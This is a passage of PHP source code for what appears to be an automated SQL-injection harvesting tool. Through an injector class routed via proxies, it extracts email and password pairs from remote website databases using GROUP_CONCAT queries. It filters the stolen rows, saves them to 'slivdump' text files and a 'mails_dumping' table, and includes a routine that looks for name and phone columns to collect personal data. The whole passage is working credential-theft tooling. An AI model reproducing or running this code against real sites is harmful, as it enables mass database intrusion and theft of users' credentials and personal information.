					if ($multi[0][0]['count(*)'] < $settings['potok']) {
						$numPotok = $this->Post->query('SELECT count(*) FROM  `multis_one` WHERE `potok` = ' . $potok . ' AND `filed_id` =' . $filed_id);
						$this->d('SELECT count(*) FROM  `multis_one` WHERE `potok` = ' . $potok . ' AND `filed_id` =' . $filed_id, 'EST UJE POTOK TAKOY!!!');

						if ($numPotok[0][0]['count(*)'] == 0) {
							$f = 'dumping_one_columns';
							$post_id = $squle[0]['posts']['id'];
							$squle[0]['posts']['url'] = str_replace('http://', '', $squle[0]['posts']['url']);
							$squle[0]['posts']['url'] = 'http://' . $squle[0]['posts']['url'];
							$h2 = parse_url($squle[0]['posts']['url']);
							$domen = $h2['host'];
							$date = time();

							if ($this->Post->query('INSERT INTO multis_one (`filed_id`,`lastlimit`,`count`,`get`,`potok`,`isp`,`post_id`,`domen`,`date`,`pid`) VALUES(' . $filed_id . ',' . $start . ',' . $oneCount . ',1,' . $potok . ',\'' . $f . '\',' . $post_id . ',\'' . $domen . '\',\'' . $date . '\',' . $this->pid . ')')) {
								$this->d($potok, ' $potok YES insert zapis');
							}
							 else {
								$this->d($potok, ' $potok NO!!!! insert zapis');
							}

							$this->Post->query('UPDATE  `starts` SET  `potok` = ' . $potok . ' WHERE  `time_start` =' . $this->timeStart);
						}
						 else {
							$this->d('POTOK UJE EST v multis_one status get=3 stavim slivWithPassConcastMulti');
							$this->d('UPDATE  `multis_one` SET  `get` = 3 WHERE  `potok`=' . $potok . ' AND `filed_id` =' . $filed_id);
							$this->Post->query('UPDATE  `multis_one` SET  `get` = 3 WHERE  `potok`=' . $potok . ' AND `filed_id` =' . $filed_id);
							return 'vpizdu';
						}
					}
					 else {
						$this->d('$multis_one[0][0][count(*)] <= $settings[potok]');

						if (6 < $potok) {
							$potok = 6;
							$this->d('potok > 6');
						}


						$this->d('UPDATE  `multis_one` SET  `get` = 3 WHERE  `potok`=' . $potok . ' AND `filed_id` =' . $filed_id);
						$this->Post->query('UPDATE  `multis_one` SET  `get` = 3 WHERE  `potok`=' . $potok . ' AND `filed_id` =' . $filed_id);
						return 'vpizdu';
					}
				}

			}
		}

		$squle[0]['posts']['url'] = str_replace('http://', '', $squle[0]['posts']['url']);
		$squle[0]['posts']['url'] = 'http://' . $squle[0]['posts']['url'];
		$url = parse_url($squle[0]['posts']['url']);
		$zone = explode('.', $url['host']);
		$zone = $zone[count($zone) - 1];
		mkdir($_SERVER['DOCUMENT_ROOT'] . '/app/webroot/slivdump_one/NOCHECK', 511);
		$filename = $_SERVER['DOCUMENT_ROOT'] . '/app/webroot/slivdump_one/' . $url['host'] . '_' . $bd[1] . '_' . $mail['Filed']['table'] . '.txt';
		$filename2 = $_SERVER['DOCUMENT_ROOT'] . '/app/webroot/slivdump_one/NOCHECK/' . $url['host'] . '_' . $bd[1] . '_' . $mail['Filed']['table'] . '.txtNOCHECK';
		$this->d($filename, '$filename');
		$fh = fopen($filename, 'a+');
		$fh2 = fopen($filename2, 'a+');
		$time = time();
		$this->l2 = 0;
		$this->tmp2 = array();
		$this->k = 0;
		$this->l5 = 0;
		$this->tmp5 = array();
		$this->emp = 0;
		$this->email_gavno = 0;
		$this->emp_pass = 0;
		$this->d($zapr . '-zapr poslednyu:' . $this->r);
		$this->d($oneCount . '-oneCount:' . $this->r);
		$this->d($count . '-count:' . $this->r);
		$this->d($start . '-start:' . $this->r);
		$this->d($potok . '-potok:' . $this->r);
		$this->d($this->pid . '-pid:' . $this->r);
		flush();
		$i = 0;

		while ($i < $zapr) {
			echo $i . '-i<br>';
			$this->workup();
			$new = time();
			$razn = $new - $time;
			$this->Post->query('UPDATE  `multis_one` SET  `prich` = \'0\'  WHERE  `potok`=' . $potok . ' AND filed_id=' . $filed_id);

			if (55 < $razn) {
				$this->d($razn . '-razn dumping_one po vremeni > 55:' . $this->r);
				$this->Post->query('UPDATE  `multis_one` SET  `get` = 3  WHERE  `potok`=' . $potok . ' AND filed_id=' . $filed_id);
				$this->Post->query('UPDATE  `multis_one` SET  `prich` = \'function group razn  > 55\'  WHERE  `potok`=' . $potok . ' AND filed_id=' . $filed_id);
				return 'vpizdu';
			}


			$time = time();
			$this->workup();
			$fff = explode(',', $this->filed);
			$str0 = '';
			$str1 = '';
			$str2 = '';
			$str3 = '';

			foreach ($fff as $fff_one ) {
				$str0 .= $fff_one . ',';
				$str1 .= 't.' . $fff_one . ',CHAR(\'58\'),';
				$str2 .= $fff_one . ',';
				$str3 .= 't.' . $fff_one . ',CHAR(58),';

				if (preg_match('/mail/si', $fff_one)) {
					$mail['Filed']['label'] = $fff_one;
				}

			}

			$str0 = substr($str0, 0, -1);
			$str1 = substr($str1, 0, -12);
			$str2 = substr($str2, 0, -1);
			$str3 = substr($str3, 0, -10);
			$this->Post->query('UPDATE  `multis_one` SET  `lastlimit` = ' . $start . ',`date`= ' . $time . ',`pid`=' . $this->pid . ' WHERE  `potok`=' . $potok . ' AND `filed_id` =' . $filed_id);

			if ($this->mysql2 == false) {
				$mysql = $this->mysqlInj->mysqlGetValue('', '(SELECT ' . $str0 . ' FROM ' . $bd[1] . '.`' . $mail['Filed']['table'] . '` LIMIT ' . $start . ',' . $this->shag . ')t', 'GROUP_CONCAT(' . $str1 . ')', 0, array());
				$this->d($mysql, '$mysql ==false -- ' . $start);
			}
			 else {
				$mysql = $this->mysqlInj->mysqlGetValue('', '(SELECT ' . $str2 . ' FROM ' . $bd[1] . '.`' . $mail['Filed']['table'] . '` LIMIT ' . $start . ',' . $this->shag . ')t', 'GROUP_CONCAT(' . $str3 . ')', 0, array());
				$this->d($mysql, '$this->mysql2==true -- ' . $start);
			}

			if ($this->mysql2 == false) {
				if (trim($mysql['GROUP_CONCAT(' . $str1 . ')']) == '') {
					$mysql = $this->mysqlInj->mysqlGetValue('', '(SELECT ' . $str2 . ' FROM ' . $bd[1] . '.`' . $mail['Filed']['table'] . '` LIMIT ' . $start . ',' . $this->shag . ')t', 'GROUP_CONCAT(' . $str3 . ')', 0, array());
					$this->d($mysql, '$mysql2 --' . $start);

					if (trim($mysql['GROUP_CONCAT(' . $str3 . ')']) != '') {
						$this->mysql2 = true;
					}

				}

			}


			$start2 = $start;
			$start = $start + $this->shag;
			$limit_enable = 1;
      $mysql['GROUP_CONCAT(' . $str1 . ')'] = trim($mysql['GROUP_CONCAT(' . $str1 . ')']);
      $mysql['GROUP_CONCAT(' . $str3 . ')'] = trim($mysql['GROUP_CONCAT(' . $str3 . ')']);
			if (empty($mysql['GROUP_CONCAT(' . $str1 . ')']) && empty($mysql['GROUP_CONCAT(' . $str3 . ')'])) {
				$this->d('STR1 AND STR3 ==33333333');
				$this->Post->query('UPDATE  `multis_one` SET  `function` = 1 WHERE  `potok` =' . $potok . ' AND `filed_id` =' . $filed_id);
				$rrr = $this->dumping_one_columns_limit($id, $potok, $start2, $oneCount, $filename, $filename2);

				if ($rrr == 'vpizdu') {
					$this->d('vpizdu');
					$this->Post->query('UPDATE  `multis_one` SET  `prich` = \'function limit vpizdu return\'  WHERE  `potok`=' . $potok . ' AND filed_id=' . $filed_id);
					return 'vpizdu';
				}


				return 'vpizdu';
			}


			$this->Post->query('UPDATE  `multis_one` SET  `function` = 0 WHERE  `potok` =' . $potok . ' AND `filed_id` =' . $filed_id);

			if ($this->mysql2 == false) {
				$this->d('111111111111111111111111111111111111111');

        $mysql['GROUP_CONCAT(' . $str1 . ')'] = trim($mysql['GROUP_CONCAT(' . $str1 . ')']);
				if (!empty($mysql['GROUP_CONCAT(' . $str1 . ')'])) {
					$mails = explode(',', $mysql['GROUP_CONCAT(' . $str1 . ')']);
					$null = 0;
					$l = 0;
					$tmp = array();
					$tmp3 = array();

					foreach ($mails as $value ) {
						$p = explode(':', $value);
						$this->d($p, '$p$p$p');
						$pass = $p[1];

						if ($p[0] != 'null') {
							$this->null--;
							$this->d($mysql, 'mysql 222-' . $i);
							preg_match('/\A(?:^([a-z0-9][a-z0-9_\-\.\+]*)@([a-z0-9][a-z0-9\.\-]{0,63}\.([a-z]{2,4}))$)\z/i', $p[0], $z);

							if ($z[0] != '') {
								$this->d('good 1');
								$m = explode('@', $z[0]);
								@$key = array_search($pass, $tmp);
								@$key2 = array_search(strlen($pass), array_slice($this->tmp2, count($this->tmp2) - 1));
								@$key5 = array_search(strlen($z[0]), array_slice($this->tmp5, count($this->tmp5) - 1));
								@$key3 = array_search($p[0], $tmp3);
								$tmp[] = $pass;
								$tmp3[] = $p[0];
								$this->tmp2[] = strlen($pass);
								$this->tmp5[] = strlen($z[0]);

								if ($key5 !== false) {
									$this->l5++;
									$this->d('bad 1');

									if (($this->dlina < $this->l5) && ($this->up_one == false)) {
										$this->Post->query('UPDATE  `multis_one` SET  `get` = 3 WHERE  `potok`=' . $potok . ' AND `filed_id` =' . $filed_id);
										$this->Post->query('UPDATE  `multis_one` SET  `prich` = \'this->l5 > ' . $this->dlina . ' odonakovie po dline\'  WHERE  `potok`=' . $potok . ' AND filed_id=' . $filed_id);

										return 'vpizdu';
									}

								}
								 else {
									$this->l5--;
								}

								if (($key === false) && ($key3 === false)) {
									$this->d('good 2');
									$bb = explode('@', $p[0]);
									$domen = $squle[0]['posts']['domen'];
									fwrite($fh2, trim($value) . "\n");
									$bb = explode('@', $p[0]);

									if ($this->Post->query('INSERT INTO mails_dumping (`email`,`pass`,`date`,`domen`,`hashtype`,`bd`,`zona`) VALUES(\'' . $p[0] . '\',\'' . $value . '\',now(),\'' . $domen . '\',\'none\',\'' . $bd[1] . '\',\'' . $zone . '\')')) {
										echo '||' . $value . '||<br/>';
										fwrite($fh, trim($value) . "\n");
									}

								}
								 else {
									++$l;
									$this->d('bad 2');

									if (($l == $this->dlina) && $this->Post->query('INSERT INTO mails_dumping (`email`,`pass`,`date`,`domen`,`hashtype`,`bd`,`zona`) VALUES(\'' . $p[0] . '\',\'' . $value . '\',now(),\'' . $domen . '\',\'none\',\'' . $bd[1] . '\',\'' . $zone . '\')')) {
										$this->Post->query('UPDATE  `multis_one` SET  `get` = 3 WHERE  `potok`=' . $potok . ' AND `filed_id` =' . $filed_id);

										if (!($this->Post->query('UPDATE  `multis_one` SET  `prich` = \'l == 20 pohojie\'  WHERE  `potok`=' . $potok . ' AND `filed_id` =' . $filed_id))) {
										}


										return 'vpizdu';
									}

								}
							}
							 else {
								$this->email_gavno++;

								if (($this->email_gavno == $this->email_bad) && ($this->up_one == false)) {
									echo 'Mnogo email_gavno ' . $this->email_bad;
									$this->logs('Mnogo email_gavno:' . $this->r, 'dumping_one_columns');
									$this->Post->query('UPDATE  `multis_one` SET  `get` = 3 WHERE  `potok`=' . $potok . ' AND `filed_id`=' . $filed_id);
									$this->Post->query('UPDATE  `multis_one` SET  `prich` = \'Mnogo email_gavno ' . $this->email_bad . '\'  WHERE  `potok`=' . $potok . ' AND `filed_id`=' . $filed_id);

									return 'vpizdu';
								}

							}
						}
						 else {
							$this->null++;
							$this->d($this->null, 'count NULL TRIM');

							if (($this->null == $this->null_count) && ($this->up_one == false)) {
								$this->d('Много пустных или null ' . $this->null);
								$this->logs('Mnogo null:' . $this->null . ' ' . $this->r, 'dumping_one_columns');
								$this->Post->query('UPDATE  `multis_one` SET  `get` = 3 WHERE  `potok`=' . $potok . ' AND filed_id=' . $filed_id);
								$this->Post->query('UPDATE  `multis_one` SET  `prich` = \'Mnogo null 100\'  WHERE  `potok`=' . $potok . ' AND filed_id=' . $filed_id);
								$this->d('UPDATE  `multis_one` SET  `get` = 3 WHERE  `potok`=' . $potok . ' AND filed_id=' . $filed_id);

								return 'vpizdu';
							}

						}

						if ($p[1] == '') {
							$this->emp_pass++;
						}


						if (($this->pass_empty < $this->emp_pass) && ($this->up_one == false)) {
							$this->Post->query('UPDATE  `multis_one` SET  `get` = 3 WHERE  `potok`=' . $potok . ' AND `filed_id` =' . $filed_id);
							$this->Post->query('UPDATE  `multis_one` SET  `prich` = \'emp_pass > ' . $this->pass_empty . '  pass pustie\'  WHERE  `potok`=' . $potok . ' AND `filed_id` =' . $filed_id);

							return 'vpizdu';
						}

					}

					$hunta = 0;
				}
				 else {
					$hunta = $hunta + 1;
					echo $hunta . '<br>';
				}
			}
			 else {
				$this->d('222222222222222222222222222');

				if (trim($mysql['GROUP_CONCAT(' . $str3 . ')']) !== '') {
					$mails = explode(',', $mysql['GROUP_CONCAT(' . $str3 . ')']);
					$null = 0;
					$l = 0;
					$tmp = array();
					$tmp3 = array();

					foreach ($mails as $value ) {
						$p = explode(':', $value);
						$pass = $p[1];
						@$key0 = array_search($pass, $this->stopword);

						if (($key0 === false) && ($p[0] != 'null')) {
							$this->d($mysql, 'mysql 222-' . $i);
							preg_match('/\A(?:^([a-z0-9][a-z0-9_\-\.\+]*)@([a-z0-9][a-z0-9\.\-]{0,63}\.([a-z]{2,4}))$)\z/i', $p[0], $z);

							if ($z[0] != '') {
								$this->d('good 1');
								$m = explode('@', $z[0]);
								@$key = array_search($pass, $tmp);
								@$key2 = array_search(strlen($pass), array_slice($this->tmp2, count($this->tmp2) - 1));
								@$key5 = array_search(strlen($z[0]), array_slice($this->tmp5, count($this->tmp5) - 1));
								@$key3 = array_search($p[0], $tmp3);
								$tmp[] = $pass;
								$tmp3[] = $p[0];
								$this->tmp2[] = strlen($pass);
								$this->tmp5[] = strlen($z[0]);

								if ($key5 !== false) {
									$this->l5++;
									$this->d('bad 1');

									if (($this->dlina < $this->l5) && ($this->up_one == false)) {
										$this->logs('$this->l5 > 75:' . $this->r, 'dumping_one_columns');
										$this->Post->query('UPDATE  `multis_one` SET  `get` = 3 WHERE  `potok`=' . $potok . ' AND `filed_id` =' . $filed_id);
										$this->Post->query('UPDATE  `multis_one` SET  `prich` = \'this->l5 >  ' . $this->dlina . ' odonakovie po dline\'  WHERE  `potok`=' . $potok . ' AND filed_id=' . $filed_id);

										return 'vpizdu';
									}

								}
								 else {
									$this->l5--;
								}

								if (($key === false) && ($key3 === false)) {
									$this->d('good 2');
									$bb = explode('@', $p[0]);
									$domen = $squle[0]['posts']['domen'];
									fwrite($fh2, trim($value) . "\n");
									$bb = explode('@', $p[0]);

									if ($this->Post->query('INSERT INTO mails_dumping (`email`,`pass`,`date`,`domen`,`hashtype`,`bd`,`zona`) VALUES(\'' . $p[0] . '\',\'' . $value . '\',now(),\'' . $domen . '\',\'none\',\'' . $bd[1] . '\',\'' . $zone . '\')')) {
										echo '||' . $value . '||<br/>';
										fwrite($fh, trim($value) . "\n");
									}

								}
								 else {
									++$l;
									$this->d('bad 2');

									if (($l == $this->dlina) && $this->Post->query('INSERT INTO mails_dumping (`email`,`pass`,`date`,`domen`,`hashtype`,`bd`,`zona`) VALUES(\'' . $p[0] . '\',\'' . $value . '\',now(),\'' . $domen . '\',\'none\',\'' . $bd[1] . '\',\'' . $zone . '\')')) {
										$this->logs('$l == ' . $this->r, 'dumping_one_columns');
										$this->Post->query('UPDATE  `multis_one` SET  `get` = 3 WHERE  `potok`=' . $potok . ' AND `filed_id` =' . $filed_id);

										if (!($this->Post->query('UPDATE  `multis_one` SET  `prich` = \'l == ' . $this->dlina . '\'  WHERE  `potok`=' . $potok . ' AND `filed_id` =' . $filed_id))) {
										}


										return 'vpizdu';
									}

								}
							}
							 else {
								$this->email_gavno++;

								if (($this->email_gavno == $this->email_bad) && ($this->up_one == false)) {
									echo 'Mnogo email_gavno 250';
									$this->logs('Mnogo email_gavno:' . $this->r, 'dumping_one_columns');
									$this->Post->query('UPDATE  `multis_one` SET  `get` = 3 WHERE  `potok`=' . $potok . ' AND `filed_id`=' . $filed_id);
									$this->Post->query('UPDATE  `multis_one` SET  `prich` = \'Mnogo email_gavno  ' . $this->email_bad . '\'  WHERE  `potok`=' . $potok . ' AND `filed_id`=' . $filed_id);

									return 'vpizdu';
								}

							}
						}
						 else {
							$this->null++;
							$this->d($this->null, 'count NULL TRIM');

							if (($this->null == $this->null_count) && ($this->up_one == false)) {
								$this->d('Много пустных или null ' . $this->null);
								$this->logs('Mnogo null:' . $this->null . ' ' . $this->r, 'dumping_one_columns');
								$this->Post->query('UPDATE  `multis_one` SET  `get` = 3 WHERE  `potok`=' . $potok . ' AND filed_id=' . $filed_id);
								$this->Post->query('UPDATE  `multis_one` SET  `prich` = \'Mnogo null ' . $this->null_count . '\'  WHERE  `potok`=' . $potok . ' AND filed_id=' . $filed_id);
								$this->d('UPDATE  `multis_one` SET  `get` = 3 WHERE  `potok`=' . $potok . ' AND filed_id=' . $filed_id);

								return 'vpizdu';
							}

						}

						if ($p[1] == '') {
							$this->emp_pass++;
						}


						if (($this->pass_empty < $this->emp_pass) && ($this->up_one == false)) {
							$this->logs('$this->emp_pass > 375:' . $this->r, 'dumping_one_columns');
							$this->Post->query('UPDATE  `multis_one` SET  `get` = 3 WHERE  `potok`=' . $potok . ' AND `filed_id` =' . $filed_id);
							$this->Post->query('UPDATE  `multis_one` SET  `prich` = \'emp_pass >  ' . $this->pass_empty . ' pass pustie\'  WHERE  `potok`=' . $potok . ' AND `filed_id` =' . $filed_id);

							return 'vpizdu';
						}

					}

					$hunta = 0;
				}
				 else {
					$hunta = $hunta + 1;
					echo $hunta . '<br>';
				}
			}

			if ($hunta == $this->hunta) {
				fclose($fh);
				$this->logs('$hunta = 20 vpizdu:' . $this->r, 'dumping_one_columns');
				$this->Post->query('UPDATE  `multis_one` SET  `get` = 3 WHERE  `potok`=' . $potok . ' AND `filed_id` =' . $filed_id);
				$this->Post->query('UPDATE  `multis_one` SET  `prich`=\'function group no data ' . $this->hunta . '\'  WHERE  `potok`=' . $potok . ' AND `filed_id` =' . $filed_id);
				return 'vpizdu';
			}


			++$i;
		}

		$this->Post->query('UPDATE  `multis_one` SET  `get` = 2 WHERE  `potok`=' . $potok . ' AND `filed_id` =' . $filed_id);
		fclose($fh);
	}

	public function dumping_one_columns_limit($id = 2, $potok = 1, $lastlimit = 0, $oneCount = 0, $filename, $filename2)
	{
		$this->d('!!!!!!!!!!!!!!!dumping_one_columns_limit!!!!!!!!!!!!!!!!!!');
		$hunta = 1;
		$mail2 = $this->Post->query('SELECT * FROM  `fileds_one` WHERE `id` = ' . $id . ' limit 1');
		$mail['Filed'] = $mail2[0]['fileds_one'];
		$filed_id = $mail['Filed']['id'];
		$squle2 = $this->Post->query('SELECT * FROM  `posts_one` WHERE `id` = ' . $mail['Filed']['post_id'] . ' limit 0,1');
		$this->d('SELECT * FROM  `posts_one` WHERE `id` = ' . $mail['Filed']['post_id'] . ' limit 0,1');
		$squle[0]['posts'] = $squle2[0]['posts_one'];

		if (!(isset($squle[0]['posts']['id']))) {
			$squle2 = $this->Post->query('SELECT * FROM  `posts` WHERE `id` = ' . $mail['Filed']['post_id'] . ' limit 0,1');
			$this->d('SELECT * FROM  `posts` WHERE `id` = ' . $mail['Filed']['post_id'] . ' limit 0,1');
			$squle[0]['posts'] = $squle2[0]['posts'];
		}


		if (!(isset($squle[0]['posts']['id']))) {
			$data = $this->Post->query('UPDATE  `fileds_one` SET  `get` =  \'3\', multi = 0 WHERE  `id` =' . $mail['Filed']['id']);
			$this->d('vpizdu');

			if (!($this->Post->query('UPDATE  `multis_one` SET  `prich`=\'functiom limit netu v post_one\'  WHERE  `potok`=' . $potok . ' AND `filed_id` =' . $filed_id))) {
				mysql_error();
			}


			return 'vpizdu';
		}


		$this->d($squle, '$squle POSTS');

		if (2 < strlen($squle[0]['posts']['sleep'])) {
			$set = $squle[0]['posts']['sleep'];
			$this->d($set, 'pass SET dump dumping_one_columns');
		}
		 else {
			$set = false;
		}

		$this->mysqlInj = new $this->Injector();
		$this->proxyCheck();
		$this->mysqlInj->inject($squle[0]['posts']['header'] . '::' . $squle[0]['posts']['url'], $squle[0], $set);
		$bd = explode(':', $mail['Filed']['ipbase']);
		$count = $mail['Filed']['count'];
		$squle[0]['posts']['url'] = str_replace('http://', '', $squle[0]['posts']['url']);
		$squle[0]['posts']['url'] = 'http://' . $squle[0]['posts']['url'];
		$url = parse_url($squle[0]['posts']['url']);
		$zone = explode('.', $url['host']);
		$zone = $zone[count($zone) - 1];
		$filename = './slivdump_one/' . $url['host'] . '.txt';
		$fh = fopen($filename, 'a+');
		$fh2 = fopen($filename2, 'a+');
		$pass = explode(':', $mail['Filed']['password']);
		$pass = $pass[1];
		$time = time();
		$fff = explode(',', $this->filed);
		$null = 0;
		$l = 0;
		$tmp = array();
		$tmp3 = array();
		$this->l2 = 0;
		$this->tmp2 = array();
		$this->k = 0;
		$this->l5 = 0;
		$this->tmp5 = array();
		$this->emp_pass = 0;
		$i = $lastlimit;

		while ($i < ceil($lastlimit + $oneCount)) {
			$this->workup();
			$new = time();
			$razn = $new - $time;

			if (55 < $razn) {
				$this->d($razn . '-razn dumping_one_limit > 55:');
				$this->Post->query('UPDATE  `multis_one` SET  `get` = 3 WHERE  `potok`=' . $potok . ' AND `filed_id` =' . $filed_id);

				if (!($this->Post->query('UPDATE  `multis_one` SET  `prich`=\'function limit razn > 55\'  WHERE  `potok`=' . $potok . ' AND `filed_id` =' . $filed_id))) {
					mysql_error();
				}


				return 'vpizdu';
			}


			$time = time();

			if (!($this->Post->query('UPDATE  `multis_one` SET  `lastlimit` = ' . $i . ',`date`= ' . $time . ' WHERE  `potok`=' . $potok . ' AND `filed_id` =' . $filed_id))) {
				mysql_error();
			}


			$mysql = $this->mysqlInj->mysqlGetValue($bd[1], $mail['Filed']['table'], $fff, $i, array(), '');
			$mails = array();

			foreach ($mysql as $vvv ) {
				$mails[] = $vvv;
			}

			$this->d($mails, '$mails 111-' . $i);

			if (($mails[0] != '') && ($mails[0] != 'null')) {
				$value = implode(':', $mails);
				$this->d('good 0');
				$p[0] = $mails[0];
				$pass = $mails[1];
				@$key0 = array_search($pass, $this->stopword);

				if (($key0 === false) && ($mails[0] != 'null')) {
					$this->d($mysql, 'mysql 222-' . $i);
					preg_match('/\A(?:^([a-z0-9][a-z0-9_\-\.\+]*)@([a-z0-9][a-z0-9\.\-]{0,63}\.([a-z]{2,4}))$)\z/i', $mails[0], $z);

					if ($z[0] != '') {
						$this->d('good 1');
						$m = explode('@', $z[0]);
						@$key = array_search($pass, $tmp);
						@$key2 = array_search(strlen($pass), array_slice($this->tmp2, count($this->tmp2) - 1));
						@$key5 = array_search(strlen($z[0]), array_slice($this->tmp5, count($this->tmp5) - 1));
						@$key3 = array_search($p[0], $tmp3);
						$tmp[] = $pass;
						$tmp3[] = $p[0];
						$this->tmp2[] = strlen($pass);
						$this->tmp5[] = strlen($z[0]);

						if ($key5 !== false) {
							$this->l5++;
							$this->d('bad 1');

							if (($this->dlina < $this->l5) && ($this->up_one == false)) {
								$this->logs('$this->l5 > 275:' . $this->r, 'dumping_one_columns_limit');
								$this->Post->query('UPDATE  `multis_one` SET  `get` = 3 WHERE  `potok`=' . $potok . ' AND `filed_id` =' . $filed_id);
								$this->Post->query('UPDATE  `multis_one` SET  `prich` = \'this->l5 > 275 odonakovie po dline\'  WHERE  `potok`=' . $potok . ' AND filed_id=' . $filed_id);
								return 'vpizdu';
							}

						}
						 else {
							$this->l5--;
						}

						if (($key === false) && ($key3 === false)) {
							$this->d('good 2');
							$bb = explode('@', $mails[0]);
							$domen = $squle[0]['posts']['domen'];
							fwrite($fh2, trim($value) . "\n");

							if ($this->Post->query('INSERT INTO mails_dumping (`email`,`pass`,`date`,`domen`,`hashtype`,`bd`,`zona`) VALUES(\'' . $mails[0] . '\',\'' . $value . '\',now(),\'' . $domen . '\',\'none\',\'' . $bd[1] . '\',\'' . $zone . '\')')) {
								echo $value . '||<br/>';
								fwrite($fh, trim($value) . "\n");
							}

						}
						 else {
							++$l;
							$this->d('bad 2');

							if (($l == $this->dlina) && $this->Post->query('INSERT INTO mails_dumping (`email`,`pass`,`date`,`domen`,`hashtype`,`bd`,`zona`) VALUES(\'' . $mails[0] . '\',\'' . $value . '\',now(),\'' . $domen . '\',\'none\',\'' . $bd[1] . '\',\'' . $zone . '\')')) {
								$this->logs('$l == 200:' . $this->r, 'dumping_one_columns_limit');
								$this->Post->query('UPDATE  `multis_one` SET  `get` = 3 WHERE  `potok`=' . $potok . ' AND `filed_id` =' . $filed_id);

								if (!($this->Post->query('UPDATE  `multis_one` SET  `prich` = \'l == 200 pohojie\'  WHERE  `potok`=' . $potok . ' AND `filed_id` =' . $filed_id))) {
									$this->d('UPDATE  `multis_one` SET  `prich` = \'l == 200 pohojie\'  WHERE  `potok`=' . $potok . ' AND `filed_id` =' . $filed_id);
									echo mysql_error();
								}


								return 'vpizdu';
							}

						}
					}
					 else {
						$this->email_gavno++;

						if (($this->email_gavno == $this->email_bad) && ($this->up_one == false)) {
							echo 'Mnogo email_gavno 250';
							$this->logs('Mnogo email_gavno:' . $this->r, 'dumping_one_columns_limit');
							$this->Post->query('UPDATE  `multis_one` SET  `get` = 3 WHERE  `potok`=' . $potok . ' AND `filed_id`=' . $filed_id);
							$this->Post->query('UPDATE  `multis_one` SET  `prich` = \'Mnogo email_gavno 250\'  WHERE  `potok`=' . $potok . ' AND `filed_id`=' . $filed_id);
							return 'vpizdu';
						}

					}
				}
				 else {
					$this->null++;
					$this->d($this->null, 'count NULL TRIM');

					if (($this->null == $this->null_count) && ($this->up_one == false)) {
						$this->d('Много пустных или null ' . $this->null);
						$this->logs('Mnogo null:' . $this->null . ' ' . $this->r, 'dumping_one_columns_limit');
						$this->Post->query('UPDATE  `multis_one` SET  `get` = 3 WHERE  `potok`=' . $potok . ' AND filed_id=' . $filed_id);
						$this->Post->query('UPDATE  `multis_one` SET  `prich` = \'Mnogo null 100\'  WHERE  `potok`=' . $potok . ' AND filed_id=' . $filed_id);
						$this->d('UPDATE  `multis_one` SET  `get` = 3 WHERE  `potok`=' . $potok . ' AND filed_id=' . $filed_id);
						return 'vpizdu';
					}

				}

				$hunta = 0;
			}
			 else {
				$hunta = $hunta + 1;
				echo $hunta . '<br>';
			}

			if ($hunta == $this->hunta) {
				fclose($fh);
				$this->Post->query('UPDATE  `multis_one` SET  `get` = 3 WHERE  `potok`=' . $potok . ' AND `filed_id` =' . $filed_id);
				$this->Post->query('UPDATE  `multis_one` SET  `prich`=\'function limit no data 200 raz\'  WHERE  `potok`=' . $potok . ' AND `filed_id` =' . $filed_id);
				$this->d('function limit no data 200 raz');
				return 'vpizdu';
			}


			++$i;
		}

		$this->Post->query('UPDATE  `multis_one` SET  `get` = 2 WHERE  `potok`=' . $potok . ' AND `filed_id` =' . $filed_id);
		fclose($fh);
	}

	public function dumping_one_filed_name()
	{
		if ($this->multidump_name_phone == false) {
			return;
		}


		$this->timeStart = $this->start('dumping_one_filed_name', 1);
		$data = $this->Post->query('SELECT * FROM  `fileds` WHERE `name` !=\':\' AND `name` !=\'\' AND `dumping_one`=0  limit 5');
		$names = array('name', 'firstname', 'first_name', 'first-name', 'lastname', 'last-name', 'last_name', 'namefirst', 'name-first', 'name_first', 'name-last', 'namelast', 'surname', 'given name', 'given_name', 'given-name', 'personal name', 'personal-name', 'personal_name', 'forename', 'fore_name', 'sirname', 'names', 'nome', 'Noun', 'customername', 'customer_name', 'contactname', 'contact_name', 'contact-name', 'Name', 'fullname', 'fname', 'voornaam', 'f_last_name', 'premise_name', 'gusername', 'username', 'user_name', 'user-name', 'nameuser', 'name-user', 'name_user', 'user', 'nickname', 'nick-name', 'nick', 'guser', 'fuser', 'f_venues_name', 'FirstName', 'unome', 'f_last_name', 'mfname', 'Nome');
		$phones = array('phone', 'phone-number', 'PhoneNumber', 'NumberPhone', 'Number-Phone', 'phone_number', 'last_name', 'namefirst', 'name-first', 'name_first', 'name-last', 'namelast');

		foreach ($data as $val ) {
			$this->d($val, $val);
			$post_id = $val['fileds']['post_id'];
			$ipbase = $val['fileds']['ipbase'];
			$ipbase2 = $ipbase;
			$table = $val['fileds']['table'];
			$label = $val['fileds']['label'];
			$url2 = $val['fileds']['site'];
			$count = $val['fileds']['count'];
			$password = $val['fileds']['password'];
			$fff = $label . ',' . str_replace(':', '', $val['fileds']['name']);
			$name = trim($name);
			$name = strtolower($name);

			foreach ($names as $name ) {
				$nnn = str_replace(':', '', $val['fileds']['name']);
				$mmm = str_replace(':', '', $val['fileds']['phone']);

				if (($name == $nnn) && ($mmm != '')) {
					$fff = $label . ',' . str_replace(':', '', $val['fileds']['name']) . ',' . str_replace(':', '', $val['fileds']['phone']);

					if ($this->Post->query('INSERT INTO `fileds_one` (`post_id`,`ipbase`,`ipbase2`,`table`,`label`,`site`,`count`,`filed`,`get`,`multi`,`password`) VALUES (' . $post_id . ',\'' . $ipbase . '\',\'' . $ipbase2 . '\',\'' . $table . '\',\'' . $label . '\',\'' . $url2 . '\',' . $count . ',\'' . $fff . '\',\'1\',1,\'' . $password . '\')')) {
						$this->d('good name +phone');
					}
					 else {
						$this->d(mysql_error());
					}
				}
				 else if ($name == $nnn) {
					if ($this->Post->query('INSERT INTO `fileds_one` (`post_id`,`ipbase`,`ipbase2`,`table`,`label`,`site`,`count`,`filed`,`get`,`multi`,`password`) VALUES (' . $post_id . ',\'' . $ipbase . '\',\'' . $ipbase2 . '\',\'' . $table . '\',\'' . $label . '\',\'' . $url2 . '\',' . $count . ',\'' . $fff . '\',\'1\',1,\'' . $password . '\')')) {
						$this->d('good NAME PROSTO');
					}
					 else {
						$this->d(mysql_error());
					}
				}

			}

			if (!($this->Post->query('UPDATE  `fileds` SET  `dumping_one` =  1 WHERE  `fileds`.`id` =' . $val['fileds']['id']))) {
				$this->d(mysql_error());
			}

		}

		$this->d('stop');
		$this->stop();
	}
// visit
	public function getmailfullMulti()
	{
	/*
		$host = '94.103.82.105';
		if (($host != $_SERVER['HTTP_HOST']) && (('www.' . $host) != $_SERVER['HTTP_HOST'])) {
			exit();
		}
*/

